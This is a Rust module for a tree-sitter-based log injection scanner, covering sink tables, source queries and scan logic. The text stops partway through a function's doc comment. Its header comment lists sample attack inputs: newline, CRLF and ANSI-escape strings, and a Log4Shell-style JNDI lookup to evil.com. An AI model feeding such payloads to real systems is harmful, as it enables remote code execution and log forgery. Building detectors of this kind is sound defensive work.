//! Log injection vulnerability detection.
//!
//! Detects potential log injection vulnerabilities where user-controlled input
//! reaches logging functions without proper sanitization. Log injection can lead to:
//!
//! - **Log Forging**: Injecting fake log entries to hide malicious activity
//! - **Newline Injection**: Adding newlines to create fake log entries
//! - **CRLF Injection**: HTTP log splitting attacks
//! - **Terminal Escape Sequences**: ANSI escape codes that can exploit log viewers
//! - **Format String Attacks**: Log4j-style format string exploitation
//! - **XSS in Web Log Viewers**: HTML/JavaScript injection in web-based log viewers
//!
//! # Detection Strategy
//!
//! 1. Parse source files using tree-sitter
//! 2. Identify calls to known logging sinks
//! 3. Extract the arguments passed to these sinks
//! 4. Track data flow backwards to identify if arguments come from taint sources
//! 5. Check for sanitization (newline removal, encoding, structured logging)
//! 6. Report findings with severity and confidence levels
//!
//! # Attack Examples
//!
//! ```python
//! # Newline injection - creates fake log entries
//! logger.info(f"User logged in: {user_input}")
//! # Input: "admin\n[2024-01-01 12:00:00] INFO: User logged in: attacker"
//!
//! # CRLF injection in HTTP logs
//! log.info(f"Request path: {path}")
//! # Input: "/page\r\nHTTP/1.1 200 OK\r\n..."
//!
//! # ANSI escape sequences
//! logger.info(f"Processing: {filename}")
//! # Input: "\x1b[2J\x1b[1;1H" (clears terminal)
//!
//! # Log4j-style format string
//! logger.info(f"User: {jndi_lookup}")
//! # Input: "${jndi:ldap://evil.com/a}"
//! ```
//!
//! # Safe Patterns
//!
//! ```python
//! # Structured logging (key-value pairs)
//! logger.info("User logged in", extra={"user": user_input})
//!
//! # Sanitized input
//! sanitized = user_input.replace("\n", "\\n").replace("\r", "\\r")
//! logger.info(f"User: {sanitized}")
//!
//! # Parameterized logging (depends on framework)
//! logger.info("User: %s", user_input)
//! ```

use std::path::Path;

use rayon::prelude::*;
use rustc_hash::FxHashMap;
use serde::{Deserialize, Serialize};
use streaming_iterator::StreamingIterator;
use tree_sitter::{Node, Query, QueryCursor, Tree};

use crate::callgraph::scanner::{ProjectScanner, ScanConfig};
use crate::error::{BrrrError, Result};
use crate::lang::LanguageRegistry;
use crate::util::format_query_error;

// Re-export common types for backward compatibility and internal use
pub use crate::security::common::{Confidence, Severity, SourceLocation};

// =============================================================================
// Type Definitions
// =============================================================================

/// Type of log injection vulnerability.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LogInjectionType {
    /// Newline injection - can forge log entries with \n
    NewlineInjection,
    /// Format string attacks (Log4j-style ${jndi:...}, %n, etc.)
    FormatString,
    /// CRLF injection - HTTP log splitting with \r\n
    CRLF,
    /// ANSI terminal escape sequences that can exploit log viewers
    TerminalEscape,
    /// HTML/XSS in web-based log viewers
    HtmlInjection,
    /// Generic user input in logs without sanitization
    UnsanitizedInput,
}

impl std::fmt::Display for LogInjectionType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NewlineInjection => write!(f, "newline_injection"),
            Self::FormatString => write!(f, "format_string"),
            Self::CRLF => write!(f, "crlf_injection"),
            Self::TerminalEscape => write!(f, "terminal_escape"),
            Self::HtmlInjection => write!(f, "html_injection"),
            Self::UnsanitizedInput => write!(f, "unsanitized_input"),
        }
    }
}

impl LogInjectionType {
    /// Get CWE ID for this injection type.
    #[must_use]
    pub const fn cwe_id(&self) -> u32 {
        match self {
            Self::NewlineInjection | Self::UnsanitizedInput => 117, // CWE-117: Log Injection
            Self::FormatString => 134,                              // CWE-134: Format String
            Self::CRLF => 93,                                       // CWE-93: CRLF Injection
            Self::TerminalEscape => 150, // CWE-150: Escape, Meta, or Control Character
            Self::HtmlInjection => 79,   // CWE-79: XSS
        }
    }

    /// Get base severity for this injection type.
    #[must_use]
    pub const fn base_severity(&self) -> Severity {
        match self {
            Self::FormatString => Severity::Critical, // Log4j-style can lead to RCE
            Self::HtmlInjection => Severity::High,    // XSS in log viewers
            Self::CRLF => Severity::High,             // HTTP response splitting
            Self::TerminalEscape => Severity::Medium, // Terminal exploitation
            Self::NewlineInjection => Severity::Medium, // Log forging
            Self::UnsanitizedInput => Severity::Low,  // Generic warning
        }
    }
}

/// A log injection finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogInjectionFinding {
    /// Location of the vulnerable log call
    pub location: SourceLocation,
    /// Severity of the vulnerability
    pub severity: Severity,
    /// Confidence level of the finding
    pub confidence: Confidence,
    /// Name of the logging function being called
    pub log_function: String,
    /// The tainted data reaching the log sink
    pub tainted_data: String,
    /// Type of log injection
    pub injection_type: LogInjectionType,
    /// Code snippet showing the vulnerable pattern
    #[serde(skip_serializing_if = "Option::is_none")]
    pub code_snippet: Option<String>,
    /// Remediation advice
    pub remediation: String,
    /// CWE reference
    pub cwe_id: u32,
    /// Whether structured logging is used (safer pattern)
    pub uses_structured_logging: bool,
}

/// Result of scanning for log injection vulnerabilities.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    /// All findings
    pub findings: Vec<LogInjectionFinding>,
    /// Number of files scanned
    pub files_scanned: usize,
    /// Count by injection type
    pub type_counts: FxHashMap<String, usize>,
    /// Count by severity
    pub severity_counts: FxHashMap<String, usize>,
}

// =============================================================================
// Logging Sink Definitions
// =============================================================================

/// A logging sink definition.
#[derive(Debug, Clone)]
struct LogSink {
    /// Pattern to match (e.g., "logger.info", "console.log")
    pattern: String,
    /// Language this sink applies to
    language: String,
    /// Module or namespace (if applicable)
    module: Option<String>,
    /// Whether this is structured logging (key-value style)
    is_structured: bool,
    /// Base severity when exploited
    severity: Severity,
    /// Description
    description: String,
}

/// Get logging sinks for a language.
fn get_log_sinks(language: &str) -> Vec<LogSink> {
    match language {
        "python" => python_log_sinks(),
        "typescript" | "javascript" => typescript_log_sinks(),
        "go" => go_log_sinks(),
        "rust" => rust_log_sinks(),
        "java" => java_log_sinks(),
        "c" | "cpp" => c_log_sinks(),
        _ => vec![],
    }
}

fn python_log_sinks() -> Vec<LogSink> {
    vec![
        // Standard logging module
        LogSink {
            pattern: "logging.debug".to_string(),
            language: "python".to_string(),
            module: Some("logging".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "logging.debug() call".to_string(),
        },
        LogSink {
            pattern: "logging.info".to_string(),
            language: "python".to_string(),
            module: Some("logging".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "logging.info() call".to_string(),
        },
        LogSink {
            pattern: "logging.warning".to_string(),
            language: "python".to_string(),
            module: Some("logging".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "logging.warning() call".to_string(),
        },
        LogSink {
            pattern: "logging.error".to_string(),
            language: "python".to_string(),
            module: Some("logging".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "logging.error() call".to_string(),
        },
        LogSink {
            pattern: "logging.critical".to_string(),
            language: "python".to_string(),
            module: Some("logging".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "logging.critical() call".to_string(),
        },
        LogSink {
            pattern: "logging.exception".to_string(),
            language: "python".to_string(),
            module: Some("logging".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "logging.exception() call".to_string(),
        },
        // Logger instance methods
        LogSink {
            pattern: "logger.debug".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.debug() call".to_string(),
        },
        LogSink {
            pattern: "logger.info".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.info() call".to_string(),
        },
        LogSink {
            pattern: "logger.warning".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.warning() call".to_string(),
        },
        LogSink {
            pattern: "logger.error".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "logger.error() call".to_string(),
        },
        LogSink {
            pattern: "logger.critical".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "logger.critical() call".to_string(),
        },
        LogSink {
            pattern: "logger.exception".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "logger.exception() call".to_string(),
        },
        // Log variable patterns (common naming)
        LogSink {
            pattern: "log.debug".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "log.debug() call".to_string(),
        },
        LogSink {
            pattern: "log.info".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "log.info() call".to_string(),
        },
        LogSink {
            pattern: "log.warning".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "log.warning() call".to_string(),
        },
        LogSink {
            pattern: "log.error".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "log.error() call".to_string(),
        },
        // print (for logging purposes)
        LogSink {
            pattern: "print".to_string(),
            language: "python".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Info,
            description: "print() used for logging".to_string(),
        },
        // structlog (structured logging - safer)
        LogSink {
            pattern: "structlog".to_string(),
            language: "python".to_string(),
            module: Some("structlog".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "structlog (structured logging)".to_string(),
        },
    ]
}

fn typescript_log_sinks() -> Vec<LogSink> {
    vec![
        // Console API
        LogSink {
            pattern: "console.log".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "console.log() call".to_string(),
        },
        LogSink {
            pattern: "console.info".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "console.info() call".to_string(),
        },
        LogSink {
            pattern: "console.warn".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "console.warn() call".to_string(),
        },
        LogSink {
            pattern: "console.error".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "console.error() call".to_string(),
        },
        LogSink {
            pattern: "console.debug".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "console.debug() call".to_string(),
        },
        LogSink {
            pattern: "console.trace".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "console.trace() call".to_string(),
        },
        // Generic logger patterns
        LogSink {
            pattern: "logger.log".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.log() call".to_string(),
        },
        LogSink {
            pattern: "logger.info".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.info() call".to_string(),
        },
        LogSink {
            pattern: "logger.warn".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.warn() call".to_string(),
        },
        LogSink {
            pattern: "logger.error".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "logger.error() call".to_string(),
        },
        LogSink {
            pattern: "logger.debug".to_string(),
            language: "typescript".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "logger.debug() call".to_string(),
        },
        // Winston logger
        LogSink {
            pattern: "winston.log".to_string(),
            language: "typescript".to_string(),
            module: Some("winston".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "winston.log() call".to_string(),
        },
        // Pino logger (structured - safer)
        LogSink {
            pattern: "pino".to_string(),
            language: "typescript".to_string(),
            module: Some("pino".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "pino (structured logging)".to_string(),
        },
        // Bunyan (structured - safer)
        LogSink {
            pattern: "bunyan".to_string(),
            language: "typescript".to_string(),
            module: Some("bunyan".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "bunyan (structured logging)".to_string(),
        },
    ]
}

fn go_log_sinks() -> Vec<LogSink> {
    vec![
        // Standard library log package
        LogSink {
            pattern: "log.Print".to_string(),
            language: "go".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "log.Print() call".to_string(),
        },
        LogSink {
            pattern: "log.Printf".to_string(),
            language: "go".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Medium, // Format string
            description: "log.Printf() call".to_string(),
        },
        LogSink {
            pattern: "log.Println".to_string(),
            language: "go".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "log.Println() call".to_string(),
        },
        LogSink {
            pattern: "log.Fatal".to_string(),
            language: "go".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "log.Fatal() call".to_string(),
        },
        LogSink {
            pattern: "log.Fatalf".to_string(),
            language: "go".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "log.Fatalf() call".to_string(),
        },
        LogSink {
            pattern: "log.Panic".to_string(),
            language: "go".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "log.Panic() call".to_string(),
        },
        // fmt.Print* (often used for logging)
        LogSink {
            pattern: "fmt.Print".to_string(),
            language: "go".to_string(),
            module: Some("fmt".to_string()),
            is_structured: false,
            severity: Severity::Info,
            description: "fmt.Print() call".to_string(),
        },
        LogSink {
            pattern: "fmt.Printf".to_string(),
            language: "go".to_string(),
            module: Some("fmt".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "fmt.Printf() call".to_string(),
        },
        LogSink {
            pattern: "fmt.Println".to_string(),
            language: "go".to_string(),
            module: Some("fmt".to_string()),
            is_structured: false,
            severity: Severity::Info,
            description: "fmt.Println() call".to_string(),
        },
        // logrus (popular logging library)
        LogSink {
            pattern: "logrus.Info".to_string(),
            language: "go".to_string(),
            module: Some("logrus".to_string()),
            is_structured: true,
            severity: Severity::Low,
            description: "logrus.Info() call".to_string(),
        },
        LogSink {
            pattern: "logrus.Warn".to_string(),
            language: "go".to_string(),
            module: Some("logrus".to_string()),
            is_structured: true,
            severity: Severity::Low,
            description: "logrus.Warn() call".to_string(),
        },
        LogSink {
            pattern: "logrus.Error".to_string(),
            language: "go".to_string(),
            module: Some("logrus".to_string()),
            is_structured: true,
            severity: Severity::Medium,
            description: "logrus.Error() call".to_string(),
        },
        LogSink {
            pattern: "logrus.WithField".to_string(),
            language: "go".to_string(),
            module: Some("logrus".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "logrus.WithField() (structured)".to_string(),
        },
        LogSink {
            pattern: "logrus.WithFields".to_string(),
            language: "go".to_string(),
            module: Some("logrus".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "logrus.WithFields() (structured)".to_string(),
        },
        // zap (structured logging)
        LogSink {
            pattern: "zap.Info".to_string(),
            language: "go".to_string(),
            module: Some("zap".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "zap.Info() (structured)".to_string(),
        },
        LogSink {
            pattern: "zap.Error".to_string(),
            language: "go".to_string(),
            module: Some("zap".to_string()),
            is_structured: true,
            severity: Severity::Low,
            description: "zap.Error() (structured)".to_string(),
        },
        // zerolog (structured logging)
        LogSink {
            pattern: "zerolog.Info".to_string(),
            language: "go".to_string(),
            module: Some("zerolog".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "zerolog.Info() (structured)".to_string(),
        },
    ]
}

fn rust_log_sinks() -> Vec<LogSink> {
    vec![
        // log crate macros
        LogSink {
            pattern: "log::info!".to_string(),
            language: "rust".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "log::info!() macro".to_string(),
        },
        LogSink {
            pattern: "log::debug!".to_string(),
            language: "rust".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "log::debug!() macro".to_string(),
        },
        LogSink {
            pattern: "log::warn!".to_string(),
            language: "rust".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "log::warn!() macro".to_string(),
        },
        LogSink {
            pattern: "log::error!".to_string(),
            language: "rust".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "log::error!() macro".to_string(),
        },
        LogSink {
            pattern: "log::trace!".to_string(),
            language: "rust".to_string(),
            module: Some("log".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "log::trace!() macro".to_string(),
        },
        // Shorthand macros (commonly used)
        LogSink {
            pattern: "info!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "info!() macro".to_string(),
        },
        LogSink {
            pattern: "debug!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "debug!() macro".to_string(),
        },
        LogSink {
            pattern: "warn!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "warn!() macro".to_string(),
        },
        LogSink {
            pattern: "error!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "error!() macro".to_string(),
        },
        LogSink {
            pattern: "trace!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "trace!() macro".to_string(),
        },
        // tracing crate (structured)
        LogSink {
            pattern: "tracing::info!".to_string(),
            language: "rust".to_string(),
            module: Some("tracing".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "tracing::info!() (structured)".to_string(),
        },
        LogSink {
            pattern: "tracing::debug!".to_string(),
            language: "rust".to_string(),
            module: Some("tracing".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "tracing::debug!() (structured)".to_string(),
        },
        LogSink {
            pattern: "tracing::warn!".to_string(),
            language: "rust".to_string(),
            module: Some("tracing".to_string()),
            is_structured: true,
            severity: Severity::Info,
            description: "tracing::warn!() (structured)".to_string(),
        },
        LogSink {
            pattern: "tracing::error!".to_string(),
            language: "rust".to_string(),
            module: Some("tracing".to_string()),
            is_structured: true,
            severity: Severity::Low,
            description: "tracing::error!() (structured)".to_string(),
        },
        // println! (often used for logging in simple programs)
        LogSink {
            pattern: "println!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Info,
            description: "println!() for logging".to_string(),
        },
        LogSink {
            pattern: "eprintln!".to_string(),
            language: "rust".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Info,
            description: "eprintln!() for logging".to_string(),
        },
    ]
}

fn java_log_sinks() -> Vec<LogSink> {
    vec![
        // java.util.logging
        LogSink {
            pattern: "logger.info".to_string(),
            language: "java".to_string(),
            module: Some("java.util.logging".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "Logger.info() call".to_string(),
        },
        LogSink {
            pattern: "logger.warning".to_string(),
            language: "java".to_string(),
            module: Some("java.util.logging".to_string()),
            is_structured: false,
            severity: Severity::Low,
            description: "Logger.warning() call".to_string(),
        },
        LogSink {
            pattern: "logger.severe".to_string(),
            language: "java".to_string(),
            module: Some("java.util.logging".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "Logger.severe() call".to_string(),
        },
        // Log4j
        LogSink {
            pattern: "log.info".to_string(),
            language: "java".to_string(),
            module: Some("log4j".to_string()),
            is_structured: false,
            severity: Severity::High, // Log4j format string vulnerabilities
            description: "Log4j log.info() - check for format string issues".to_string(),
        },
        LogSink {
            pattern: "log.error".to_string(),
            language: "java".to_string(),
            module: Some("log4j".to_string()),
            is_structured: false,
            severity: Severity::High,
            description: "Log4j log.error() - check for format string issues".to_string(),
        },
        LogSink {
            pattern: "log.warn".to_string(),
            language: "java".to_string(),
            module: Some("log4j".to_string()),
            is_structured: false,
            severity: Severity::High,
            description: "Log4j log.warn() - check for format string issues".to_string(),
        },
        LogSink {
            pattern: "log.debug".to_string(),
            language: "java".to_string(),
            module: Some("log4j".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "Log4j log.debug() - check for format string issues".to_string(),
        },
        // SLF4J
        LogSink {
            pattern: "slf4j.info".to_string(),
            language: "java".to_string(),
            module: Some("slf4j".to_string()),
            is_structured: false,
            severity: Severity::Medium,
            description: "SLF4J info() call".to_string(),
        },
        // System.out.println (used for logging)
        LogSink {
            pattern: "System.out.println".to_string(),
            language: "java".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "System.out.println() for logging".to_string(),
        },
        LogSink {
            pattern: "System.err.println".to_string(),
            language: "java".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "System.err.println() for logging".to_string(),
        },
    ]
}

fn c_log_sinks() -> Vec<LogSink> {
    vec![
        // Standard output
        LogSink {
            pattern: "printf".to_string(),
            language: "c".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium, // Format string vulnerability
            description: "printf() call - format string risk".to_string(),
        },
        LogSink {
            pattern: "fprintf".to_string(),
            language: "c".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "fprintf() call - format string risk".to_string(),
        },
        LogSink {
            pattern: "sprintf".to_string(),
            language: "c".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::High, // Buffer overflow + format string
            description: "sprintf() call - format string and buffer overflow risk".to_string(),
        },
        LogSink {
            pattern: "snprintf".to_string(),
            language: "c".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "snprintf() call - format string risk".to_string(),
        },
        // syslog
        LogSink {
            pattern: "syslog".to_string(),
            language: "c".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Medium,
            description: "syslog() call".to_string(),
        },
        LogSink {
            pattern: "openlog".to_string(),
            language: "c".to_string(),
            module: None,
            is_structured: false,
            severity: Severity::Low,
            description: "openlog() call".to_string(),
        },
    ]
}

// =============================================================================
// Tree-sitter Queries
// =============================================================================

/// Get tree-sitter query for detecting log sinks in Python.
const PYTHON_LOG_SINK_QUERY: &str = r#"
; logging module calls
(call function: (attribute object: (identifier) @module attribute: (identifier) @func)
  (#any-of? @module "logging" "logger" "log")
  (#any-of? @func "debug" "info" "warning" "error" "critical" "exception" "log")
  arguments: (argument_list) @args) @sink

; print() calls (may be used for logging)
(call function: (identifier) @func
  (#eq? @func "print")
  arguments: (argument_list) @args) @sink

; structlog calls
(call function: (attribute attribute: (identifier) @func)
  (#any-of? @func "info" "debug" "warning" "error" "critical" "msg" "bind")
  arguments: (argument_list) @args) @sink
"#;

/// Get tree-sitter query for detecting log sinks in TypeScript/JavaScript.
const TYPESCRIPT_LOG_SINK_QUERY: &str = r#"
; console.* calls
(call_expression function: (member_expression object: (identifier) @obj property: (property_identifier) @func)
  (#eq? @obj "console")
  (#any-of? @func "log" "info" "warn" "error" "debug" "trace")
  arguments: (arguments) @args) @sink

; logger.* calls (generic pattern)
(call_expression function: (member_expression object: (identifier) @obj property: (property_identifier) @func)
  (#any-of? @obj "logger" "log" "Logger" "winston" "bunyan" "pino")
  (#any-of? @func "log" "info" "warn" "error" "debug" "trace" "verbose" "silly")
  arguments: (arguments) @args) @sink

; process.stdout.write / process.stderr.write (logging)
(call_expression function: (member_expression
    object: (member_expression object: (identifier) @proc property: (property_identifier) @stream)
    property: (property_identifier) @method)
  (#eq? @proc "process")
  (#any-of? @stream "stdout" "stderr")
  (#eq? @method "write")
  arguments: (arguments) @args) @sink
"#;

/// Get tree-sitter query for detecting log sinks in Go.
const GO_LOG_SINK_QUERY: &str = r#"
; log.* calls
(call_expression function: (selector_expression operand: (identifier) @pkg field: (field_identifier) @func)
  (#any-of? @pkg "log" "logrus" "zap" "zerolog")
  (#any-of? @func "Print" "Printf" "Println" "Fatal" "Fatalf" "Fatalln" "Panic" "Panicf" "Panicln"
            "Info" "Infof" "Warn" "Warnf" "Error" "Errorf" "Debug" "Debugf" "Trace" "Tracef"
            "WithField" "WithFields" "WithError")
  arguments: (argument_list) @args) @sink

; fmt.Print* calls
(call_expression function: (selector_expression operand: (identifier) @pkg field: (field_identifier) @func)
  (#eq? @pkg "fmt")
  (#any-of? @func "Print" "Printf" "Println" "Fprint" "Fprintf" "Fprintln" "Sprint" "Sprintf" "Sprintln")
  arguments: (argument_list) @args) @sink
"#;

/// Get tree-sitter query for detecting log sinks in Rust.
/// Note: Rust macros are harder to match, this catches common patterns.
const RUST_LOG_SINK_QUERY: &str = r#"
; log crate macros (as macro invocations)
(macro_invocation macro: (identifier) @func
  (#any-of? @func "info" "debug" "warn" "error" "trace" "log")
  (token_tree) @args) @sink

; println!/eprintln! macros
(macro_invocation macro: (identifier) @func
  (#any-of? @func "println" "eprintln" "print" "eprint")
  (token_tree) @args) @sink

; tracing macros
(macro_invocation macro: (scoped_identifier) @func
  (token_tree) @args) @sink
"#;

/// Get tree-sitter query for detecting log sinks in Java.
const JAVA_LOG_SINK_QUERY: &str = r#"
; Logger method calls
(method_invocation object: (identifier) @obj name: (identifier) @method
  (#any-of? @obj "log" "logger" "LOG" "LOGGER" "Logger")
  (#any-of? @method "info" "debug" "warn" "warning" "error" "trace" "severe" "fine" "finer" "finest")
  arguments: (argument_list) @args) @sink

; System.out.println / System.err.println
(method_invocation object: (field_access object: (identifier) @sys field: (identifier) @stream)
  name: (identifier) @method
  (#eq? @sys "System")
  (#any-of? @stream "out" "err")
  (#any-of? @method "println" "print" "printf")
  arguments: (argument_list) @args) @sink
"#;

/// Get tree-sitter query for detecting log sinks in C/C++.
const C_LOG_SINK_QUERY: &str = r#"
; printf family
(call_expression function: (identifier) @func
  (#any-of? @func "printf" "fprintf" "sprintf" "snprintf" "vprintf" "vfprintf" "vsprintf" "vsnprintf"
            "syslog" "puts" "fputs")
  arguments: (argument_list) @args) @sink

; perror
(call_expression function: (identifier) @func
  (#eq? @func "perror")
  arguments: (argument_list) @args) @sink
"#;

fn get_log_sink_query(language: &str) -> Option<&'static str> {
    match language {
        "python" => Some(PYTHON_LOG_SINK_QUERY),
        "typescript" | "javascript" => Some(TYPESCRIPT_LOG_SINK_QUERY),
        "go" => Some(GO_LOG_SINK_QUERY),
        "rust" => Some(RUST_LOG_SINK_QUERY),
        "java" => Some(JAVA_LOG_SINK_QUERY),
        "c" | "cpp" => Some(C_LOG_SINK_QUERY),
        _ => None,
    }
}

/// Get tree-sitter query for detecting taint sources.
fn get_taint_source_query(language: &str) -> Option<&'static str> {
    // Reuse the taint source queries from command injection detection
    match language {
        "python" => Some(
            r#"
; HTTP request parameters (Flask, Django, FastAPI)
(attribute object: (identifier) @obj attribute: (identifier) @attr
  (#any-of? @obj "request" "req")
  (#any-of? @attr "args" "form" "data" "json" "values" "files" "headers" "cookies" "get_json" "params" "query_params" "body")) @source

; input() builtin
(call function: (identifier) @func (#eq? @func "input")) @source

; Environment variables
(subscript value: (attribute object: (identifier) @obj attribute: (identifier) @attr)
  (#eq? @obj "os")
  (#eq? @attr "environ")) @source
(call function: (attribute object: (identifier) @obj attribute: (identifier) @attr)
  (#eq? @obj "os")
  (#any-of? @attr "getenv" "environ")) @source

; File read operations
(call function: (attribute attribute: (identifier) @method)
  (#any-of? @method "read" "readline" "readlines")) @source

; sys.argv
(subscript value: (attribute object: (identifier) @obj attribute: (identifier) @attr)
  (#eq? @obj "sys")
  (#eq? @attr "argv")) @source
"#,
        ),
        "typescript" | "javascript" => Some(
            r#"
; Express req.body, req.query, req.params
(member_expression object: (identifier) @obj property: (property_identifier) @prop
  (#eq? @obj "req")
  (#any-of? @prop "body" "query" "params" "headers" "cookies")) @source

; process.argv
(member_expression object: (identifier) @obj property: (property_identifier) @prop
  (#eq? @obj "process")
  (#eq? @prop "argv")) @source

; process.env
(member_expression object: (member_expression object: (identifier) @obj property: (property_identifier) @prop)
  (#eq? @obj "process")
  (#eq? @prop "env")) @source

; DOM input
(call_expression function: (member_expression property: (property_identifier) @method)
  (#any-of? @method "getElementById" "querySelector")) @source
"#,
        ),
        "go" => Some(
            r#"
; HTTP request
(selector_expression operand: (identifier) @obj field: (field_identifier) @field
  (#any-of? @obj "r" "req" "request")
  (#any-of? @field "Body" "URL" "Form" "PostForm" "Header")) @source

; URL query
(call_expression function: (selector_expression field: (field_identifier) @method)
  (#any-of? @method "Query" "FormValue" "PostFormValue")) @source

; os.Args
(selector_expression operand: (identifier) @pkg field: (field_identifier) @field
  (#eq? @pkg "os")
  (#eq? @field "Args")) @source

; Environment
(call_expression function: (selector_expression operand: (identifier) @pkg field: (field_identifier) @method)
  (#eq? @pkg "os")
  (#any-of? @method "Getenv" "LookupEnv")) @source
"#,
        ),
        _ => None,
    }
}

// =============================================================================
// Scanning Implementation
// =============================================================================

/// Scan a directory for log injection vulnerabilities.
///
/// # Arguments
///
/// * `path` - Directory to scan
/// * `language` - Optional language filter (scans all supported languages if None)
///
/// # Returns
///
/// `ScanResult` with all findings.
pub fn scan_log_injection(path: &Path, language: Option<&str>) -> Result<ScanResult> {
    let path_str = path
        .to_str()
        .ok_or_else(|| BrrrError::InvalidArgument("Invalid path encoding".to_string()))?;

    let scanner = ProjectScanner::new(path_str)?;
    let config = match language {
        Some(lang) => ScanConfig::for_language(lang),
        None => ScanConfig::default(),
    };

    let scan_result = scanner.scan_with_config(&config)?;
    let files = scan_result.files;

    // Process files in parallel
    let all_findings: Vec<LogInjectionFinding> = files
        .par_iter()
        .filter_map(|file| scan_file_log_injection(file, language).ok())
        .flatten()
        .collect();

    // Build statistics
    let mut type_counts: FxHashMap<String, usize> = FxHashMap::default();
    let mut severity_counts: FxHashMap<String, usize> = FxHashMap::default();

    for finding in &all_findings {
        *type_counts
            .entry(finding.injection_type.to_string())
            .or_insert(0) += 1;
        *severity_counts
            .entry(finding.severity.to_string())
            .or_insert(0) += 1;
    }

    Ok(ScanResult {
        findings: all_findings,
        files_scanned: files.len(),
        type_counts,
        severity_counts,
    })
}

/// Scan a single file for log injection vulnerabilities.
///
/// # Arguments
///
